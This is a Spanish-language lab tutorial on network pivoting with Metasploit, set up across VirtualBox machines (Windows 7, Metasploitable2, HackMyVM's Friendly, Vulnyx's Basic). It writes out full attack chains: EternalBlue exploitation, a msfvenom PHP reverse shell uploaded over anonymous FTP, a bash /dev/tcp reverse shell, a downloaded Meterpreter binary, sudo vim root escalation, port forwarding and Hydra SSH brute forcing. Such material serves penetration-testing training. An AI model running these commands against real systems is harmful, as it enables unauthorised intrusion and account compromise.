---
icon: '8'
---

# Pivoting con Metasploit

## Presentación del Mapa de Red

SI encontramos en una máquina solo una interfaz de red eso signfica que esa no es la que tenemos que hacer **Pivoting** ya que no se puede. A continuación enseñó un ejemplo de lo que podría ser.

<figure><img src="../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

## Pivoting en Entornos Windows

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

{% embed url="https://sourceforge.net/projects/metasploitable/files/Metasploitable2" %}

Este sería el esquema que vamos a tratar. Se realiza **Pivoting** en la máquina **Windows**.&#x20;

<figure><img src="../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>

Ahora explicaré cómo configurar una red virtual en VirtualBox y asignar diferentes adaptadores de red a las máquinas virtuales (VM) involucradas en un entorno de pentesting. En este caso, utilizaremos máquinas con Windows 7, Metasploitable2 y Kali Linux.

### 1. Configuración de la Red en VirtualBox

1. **Acceder al Administrador de Red:**
   * En la ventana principal de VirtualBox, dirígete a la barra de menús superior y selecciona **Archivo** > **Herramientas** > **Administrador de red**.
2. **Crear una nueva Red Interna (NAT):**
   * En el Administrador de Red, localiza el apartado **Redes NAT**.
   * Haz clic en el botón **Crear** para añadir una nueva red.
3. **Asignación de la red NAT:**
   * Dale un nombre a la red, por ejemplo, `Red_Pivoting`.
   * Asigna el prefijo IPv4 de la red como `10.10.10.0/24`.
   * Asegúrate de que se haya asignado correctamente y haz clic en **Aplicar**.

Ahora tienes configurada una red interna (NAT) que utilizarás para conectar las máquinas virtuales.

### 2. Configuración de la Máquina Windows 7

1. **Acceder a la configuración de la máquina:**
   * En VirtualBox, selecciona la máquina de Windows 7 y haz clic en **Configuración**.
2. **Configuración de adaptadores de red:**
   * En el panel de configuración de la máquina, ve a la sección **Red**.
   * Habilita **Adaptador 2**, selecciona la opción **Conectado a** y elige **Red NAT**. Esta configuración le permitirá a la máquina Windows 7 comunicarse a través de la red NAT que acabamos de crear.
3. **Verificación de interfaces de red:**
   * Ahora la máquina Windows 7 tendrá dos interfaces de red: una asociada al adaptador puente (que se conecta a la red física de tu PC) y otra conectada a la red NAT que acabamos de configurar.

### 3. Configuración de la Máquina Metasploitable2

1. **Configurar adaptador de red en Metasploitable2:**
   * Selecciona la máquina Metasploitable2 en VirtualBox y ve a la configuración.
   * Asegúrate de que **solo hay un adaptador de red** conectado y que esté configurado para usar **Red NAT**.

Esto asegura que Metasploitable2 estará en la misma red NAT que la máquina Windows 7, pero sin interfaces adicionales que puedan complicar la configuración.

### 4. Configuración de la Máquina Kali Linux

1. **Configurar adaptador de red para Kali Linux:**
   * Selecciona la máquina Kali Linux y abre su configuración en VirtualBox.
   * En la sección **Red**, configura el **Adaptador 1** como un **Adaptador puente**. Esto hará que Kali Linux se conecte directamente a la red física de tu equipo, permitiéndole interactuar con otras máquinas de la misma red local.

### 5. Orden de Arranque

1. **Kali Linux**: Inicia primero.
2. **Windows 7**: Luego, enciende la máquina víctima.
3. **Metasploitable2**: Finalmente, arranca la máquina vulnerable.

### 6. Comprobaciones de Red

#### Windows 7

* Abre la terminal y ejecuta `ipconfig`.
* Verifica que haya **dos interfaces de red**: una para el adaptador puente y otra para la red NAT.

#### Kali Linux

* Abre la terminal y ejecuta `ifconfig`.
* Asegúrate de que solo haya **una interfaz de red** conectada a la red puente.

#### Metasploitable2

* Inicia sesión con:
  * **Usuario**: `msfadmin`
  * **Contraseña**: `msfadmin`
* Ejecuta `ifconfig` y asegúrate de que solo haya **una interfaz de red** conectada a la red NAT.

### 7. Infiltración en la Máquina Windows7 y Pivoting

Para identificar las máquinas en la red local:

```bash
arp-scan -I eth0 --localnet
```

Explotación de la Vulnerabilidad EternalBlue.

```
msfconsole
search eternalblue
use 0
show options
set RHOSTS <IP máquina víctima>
run
```

En meterpreter.

```bash
ipconfig
```

Busca una segunda IP en la red NAT en la interfaz 13. Esta podría indicar una red interna para pivoting. Si solo hay una IP, tal vez esta máquina no sea adecuada para pivoting.

Poner en Segundo Plano la Sesión de Meterpreter

```
Ctrl+Z
```

Para ver las sesiones en segundo plano.

```
sessions -l
```

Módulo de Metasploit para encontrar equipos de la Red Interna.

```bash
use windows/gather/arp_scanner
show options
set SESSION 1
set RHOSTS <IP máquina víctima>/24 #Rango de las IPs por eso el 24
run
```

Nos encuentra las distintas IPs de nuestra Red Interna. Ahora quiero que me envíe el tráfico desde la máquina víctima Windows a la máquina víctima objetivo Metasploitable2 para que llegue a mi Kali.

```bash
use multi/manage/autoroute
show options
set SESSION 1
run
```

Ya tenemos el tráfico enrutado. Hacer escaneo de los puertos abiertos de la máquina víctima.

```bash
use scanner/portscan/tcp
show options
set RHOSTS <IP máquina víctima>
run
```

Vemos los puertos abiertos es hacer **`nmap`** pero con **Metasploit**. En caso de hacer el Pivoting en Windows realizamos lo siguiente.

```bash
use post/windows/manage/portproxy
show options
set CONNECT_ADDRESS <IP máquina víctima> 
set CONNECT_PORT 80  # Puerto al que queremos acceder
set LOCAL_ADDRESS 0.0.0.0  # Siempre debe ser 0.0.0.0
set LOCAL_PORT 5000  # Puerto local para redirigir el tráfico del puerto objetivo
set SESSION 1  # ID de la sesión de Meterpreter de la máquina Windows
run
```

Abrimos el navegador con la IP de la máquina Windows 7 con el puerto 5000 porque es donde me he traído el puerto 80.

## Preparación del Laboratorio de Pivoting en Linux

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly" %}

{% embed url="https://vulnyx.com/#basic" %}

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-11-06 163901.png" alt=""><figcaption></figcaption></figure>

### 1. Configuración de Red en VirtualBox

Para crear una red en VirtualBox y configurar las máquinas necesarias, sigue estos pasos:

1. **Creación de Red NAT**:
   * Ve a **Archivo** > **Herramientas** > **Administrador de red**.
   * Crea una red NAT con el nombre `Red_Pivoting` y asigna la dirección IP `10.10.10.0/24`.
2. **Configuración de Máquinas Virtuales**:
   * **Máquina Kali**:
     * En la configuración de red, elige **Adaptador puente** para el único adaptador de red activo.
   * **Máquina Friendly** (Máquina intermedia):
     * Configura el **primer adaptador** como **Adaptador puente**.
     * Configura el **segundo adaptador** en modo **Red NAT** y selecciona la red `Red_Pivoting`.
   * **Máquina Basic** (Máquina final):
     * Activa solo un adaptador de red y configúralo en modo **Red NAT**, seleccionando la red `Red_Pivoting`.
3. **Iniciar Máquinas**:
   * Con las configuraciones completadas, inicia las máquinas en el orden necesario.

### 2. Detección y Exploración de Vulnerabilidades

#### Paso 1: Identificación de la Máquina Objetivo

Desde la máquina Kali, ejecuta el siguiente comando para identificar dispositivos en la red local:

```bash
arp-scan -I eth0 --localnet
```

#### Paso 2: Escaneo de Vulnerabilidades con Nmap

Realiza un escaneo con Nmap en la máquina objetivo para detectar posibles vulnerabilidades. Utiliza el siguiente comando:

```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn <IP máquina víctima>
```

En los resultados, se observa que los puertos **80** y **21** están abiertos.

### 3. Acceso a la Máquina Vulnerable

#### Paso 1: Exploración del Servicio FTP

El puerto **21** (FTP) está abierto, permitiendo autenticación con el usuario `anonymous` y una contraseña en blanco (comportamiento predeterminado).

#### Paso 2: Creación del Payload

Genera un payload para obtener acceso remoto con `msfvenom`:

```bash
msfvenom -p php/reverse_php LHOST=<IP máquina atacante> LPORT=443 -f raw > pwnws.php
```

#### Paso 3: Subida del Payload

Accede al servicio FTP y sube el payload utilizando el siguiente comando:

```bash
put pwned.php
```

#### Paso 4: Configuración de Escucha

Pon el puerto 443 en escucha para recibir la conexión inversa:

```bash
nc -nlvp 443
```

#### Paso 5: Carga del Payload

Para activar el payload y obtener acceso, visita la siguiente URL:

```arduino
http://<IP máquina víctima>/pwned.php
```

### 4. Estabilización de la Conexión y Creación de Payload para Meterpreter

#### Paso 1: Estabilización de la Conexión

Dado que la conexión inicial no es estable, creamos una nueva escucha en el puerto **444**:

```bash
nc -nlvp 444
```

Luego, transferimos la sesión del puerto **443** al **444** con el siguiente comando:

```bash
bash -c "sh -i >& /dev/tcp/<IP máquina atacante>/444 0>&1"
```

#### Paso 2: Creación de un Payload para Meterpreter

Para mejorar el control sobre la máquina, generamos un payload de Meterpreter con `msfvenom`:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
```

#### Paso 3: Compartir el Payload

Inicia un servidor web en Python para facilitar la transferencia del archivo malicioso a la máquina víctima:

```bash
python3 -m http.server 80
```

#### Paso 4: Descargar el Payload en la Máquina Víctima

Desde la sesión activa en la máquina víctima, descarga el payload usando `wget`:

```bash
wget http://1.2.3.4/virus
```

### 5. Configuración de Metasploit para Recibir la Sesión

#### Paso 1: Iniciar el Handler en Metasploit

Abre Metasploit y selecciona el módulo de handler:

```bash
use multi/handler
```

#### Paso 2: Verificar Opciones del Módulo

Muestra las opciones del módulo seleccionado:

```bash
show options
```

#### Paso 3: Configuración del Payload

Elige el payload de Meterpreter adecuado para Linux:

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

#### Paso 4: Configuración de Dirección IP

Asigna la dirección IP de la máquina atacante:

```bash
set LHOST <IP máquina atacante>
```

#### Paso 5: Ejecutar el Handler

Inicia el handler para recibir la sesión:

```bash
run
```

### 6. Ejecución del Payload en la Máquina Víctima

#### Paso 1: Asignar Permisos de Ejecución

En la máquina intermedia **Friendly**, otorga permisos de ejecución al archivo malicioso:

```bash
chmod +x virus
```

#### Paso 2: Ejecutar el Payload

Inicia la ejecución del archivo para enviar la sesión a Metasploit:

```bash
./virus
```

### 7. Escalada de Privilegios

Para realizar pivoting, necesitamos obtener privilegios de **root** ya que como usuarios `www-data` tenemos permisos limitados.

#### Paso 1: Verificación de Permisos

Comprobamos los permisos `sudo` del usuario actual:

```bash
sudo -l
```

El resultado muestra que podemos ejecutar el binario `/usr/bin/vim` con privilegios elevados. Antes de continuar, configuramos el TTY:

```bash
script /dev/null -c bash
```

#### Paso 2: Escalada de Privilegios con Vim

Consultando **GTFOBins**, encontramos el comando para escalar privilegios utilizando `vim`:

```bash
sudo vim -c ':!/bin/sh'
```

### 8. Finalización del Pivoting

Con la sesión de **root** obtenida, podemos completar el proceso de pivoting ejecutando el payload en la máquina intermedia:

```bash
./virus
```

## Pivoting en Entornos Linux

### 1. Identificar las Interfaces de Red

Desde el intérprete de **Meterpreter** en la máquina intermedia **Friendly**, listamos las interfaces de red para visualizar la red interna:

```bash
ipconfig
```

Observaremos dos interfaces de red:

* **Friendly**: máquina intermedia.
* **Basic**: la máquina final en la red interna.

### 2. Poner en Segundo Plano la Sesión de Meterpreter

Para escanear otros dispositivos en la red, enviamos la sesión actual de **Meterpreter** a segundo plano:

* Usar `Ctrl + Z` para minimizar la sesión.
*   Confirmar que la sesión sigue activa con:

    ```bash
    sessions -l
    ```

### 3. Añadir Rutas y Configurar Enrutamiento

Configuramos el enrutamiento para escanear la red interna cargando el módulo `autoroute` en Metasploit:

```bash
use multi/manage/autoroute
```

*   Asigna el **SESSION ID** adecuado (en este caso, `1`):

    ```bash
    set SESSION 1
    ```
*   Ejecuta el módulo:

    ```bash
    run
    ```
*   Verifica el enrutamiento configurado:

    ```bash
    route
    ```

### 4. Crear un Script de Escaneo de Red en Bash

Para identificar otros dispositivos en la red interna, creamos un script en **bash**. En tu máquina local, crea el archivo:

```bash
nano escaner.sh
```

Incluye el siguiente contenido en el script:

```bash
#!/bin/bash

for i in {1..255}; do
  timeout 1 bash -c "ping -c 1 10.0.10.$i" >/dev/null
  if [ $? -eq 0 ]; then
    echo "El host 10.0.10.$i está activo"
  fi
done
```

Este script envía un **ping** a las IPs en el rango `10.0.10.1 - 10.0.10.255` para identificar hosts activos.

### 5. Transferir el Script a la Máquina Intermedia

Para transferir el script a la máquina intermedia:

1.  Inicia un servidor HTTP en tu máquina:

    ```bash
    python3 -m http.server 80
    ```
2.  Desde la sesión de Meterpreter, descarga el script en **Friendly**:

    ```bash
    wget <IP del servidor>/escaner.sh
    ```
3.  Verifica que el archivo se transfirió correctamente:

    ```bash
    ls
    ```
4.  Asigna permisos de ejecución al archivo:

    ```bash
    chmod +x escaner.sh
    ```
5.  Ejecuta el script para ver los hosts activos en la red interna:

    ```bash
    ./escaner.sh
    ```

### 6. Escaneo de Puertos con Metasploit

En **Metasploit**, usa el módulo de escaneo de puertos TCP para analizar la IP identificada.

```bash
use scanner/portscan/tcp
set RHOSTS <IP máquina víctima>
run
```

Este módulo muestra los puertos abiertos en la máquina objetivo.

### 7. Redirección de Puertos (Port Forwarding)

Para acceder a los servicios en la máquina víctima, redirigimos sus puertos hacia nuestro equipo local.

Ejemplo de redirección para **SSH** en el puerto `22` hacia el puerto `222` en tu máquina:

```bash
session -i 1
portfwd add -l 222 -p 22 -r <IP máquina víctima>
```

Conéctate al servicio SSH desde tu terminal local:

```bash
ssh dimitri@127.0.0.1 -p 222
```

Si necesitas redirigir otro puerto, como el `631`, puedes mapearlo al puerto `5000` en tu equipo:

```bash
portfwd add -l 5000 -p 631 -r 1.1.1.8
```

Ahora puedes acceder al servicio en tu navegador en `127.0.0.1:5000`.

### 8. Ataque de Fuerza Bruta con Hydra

Para realizar un ataque de fuerza bruta en el servicio SSH, utiliza **Hydra**:

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
```

## Cómo Hacer Pivoting mediante SSH – \[OPCIONAL]

{% embed url="https://sourceforge.net/projects/metasploitable/files/Metasploitable2" %}

### 1. Configuración del Entorno

En este escenario, tenemos tres máquinas configuradas de la siguiente manera:

1. **Máquina Atacante**: Kali Linux
   * Conexión de red: Adaptador en modo puente.
2. **Máquina Intermedia**: Ubuntu
   * Conexión de red: Adaptador en modo puente y otro adaptador en red interna.
3. **Máquina Objetivo**: Metasploitable2
   * Conexión de red: Adaptador en modo red interna (conectada solo con la máquina intermedia Ubuntu).

**Objetivo**: Realizar un pivoting desde Kali Linux para acceder a la máquina Metasploitable2 a través de Ubuntu, utilizando SSH y la herramienta SSHuttle.

### 2. Configurar SSH en la Máquina Intermedia (Ubuntu)

1.  **Instalar y habilitar SSH** en la máquina intermedia Ubuntu si no está ya configurado:

    ```bash
    sudo apt update
    sudo apt install openssh-server -y
    sudo systemctl enable ssh
    sudo systemctl start ssh
    ```
2.  **Verificar las interfaces de red** en Ubuntu para identificar las IP disponibles:

    ```bash
    bashCopiar códigohostname -I
    ```

    Esto mostrará las direcciones IP asignadas a cada interfaz. Necesitaremos la IP del adaptador en **modo puente** para conectarnos desde Kali Linux.

### 3. Conectar Kali Linux a Ubuntu a través de SSHuttle

1.  En Kali Linux, usa **SSHuttle** para enrutar el tráfico de red hacia la red interna de Ubuntu, permitiendo el acceso a la máquina Metasploitable2:

    ```bash
    sshuttle -r <usuario_en_ubuntu>@<IP_de_ubuntu> 10.10.10.0/24
    ```

    Donde:

    * `<usuario_en_ubuntu>` es el usuario en la máquina Ubuntu.
    * `<IP_de_ubuntu>` es la dirección IP del adaptador en modo puente en la máquina Ubuntu.
    * `10.10.10.0/24` es el rango de la red interna (ajusta este rango según la configuración de tu red interna).

    **Explicación**: El comando indica a **SSHuttle** que redirija todo el tráfico para la red `10.10.10.0/24` a través de la conexión SSH con Ubuntu. Esto nos permite "pivotar" hacia la máquina Metasploitable2, situada en la red interna.

### 4. Identificar la IP de la Máquina Objetivo (Metasploitable2)

En la máquina intermedia (Ubuntu), ejecuta **arp-scan** para descubrir los dispositivos conectados en la red interna y obtener la IP de la máquina Metasploitable2:

```bash
sudo arp-scan -I enp0s8 --localnet
```

Donde:

* `enp0s8` es la interfaz configurada en red interna en Ubuntu (ajusta el nombre de la interfaz según tu sistema).

Este comando mostrará las IPs de los dispositivos activos en la red interna. Anota la IP de Metasploitable2 para acceder a ella en el siguiente paso.

### 5. Acceder a la Máquina Objetivo desde Kali Linux

Ahora, desde **Kali Linux**, puedes acceder directamente a la máquina Metasploitable2 usando la IP obtenida en el paso anterior.

Puedes, por ejemplo, abrir la IP de Metasploitable2 en un navegador o realizar escaneos de puertos utilizando herramientas como `nmap`:

```bash
nmap -sV <IP_de_metasploitable2>
```

Esto te permitirá enumerar servicios y realizar pruebas en la máquina objetivo como si estuviera en la misma red que Kali Linux.
